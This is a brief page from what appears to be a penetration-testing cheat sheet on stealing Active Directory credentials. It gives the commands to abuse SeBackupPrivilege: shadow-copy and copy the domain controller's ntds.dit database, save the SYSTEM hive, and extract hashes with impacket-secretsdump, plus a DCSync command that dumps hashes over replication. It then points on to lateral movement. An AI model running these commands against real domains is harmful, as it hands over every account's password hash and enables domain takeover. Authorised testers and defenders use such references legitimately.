# AD credential access

[← Active Directory quick reference](../05-active-directory.md) · [Windows token rights](../windows/token-groups.md)

This page covers the DC database and directory replication. For local SAM, LSA, LSASS, and cached material on a Windows foothold, use [Windows credential access](../windows/credential-access.md).

## DC database or replication

`SeBackupPrivilege` → snapshot + offline NTDS:

```cmd
diskshadow /s C:\Temp\dsh.txt
robocopy /b X:\Windows\NTDS C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

DCSync (replication rights):

```bash
impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
```

Then match account/hash to a reachable service: [lateral movement](lateral-movement.md).
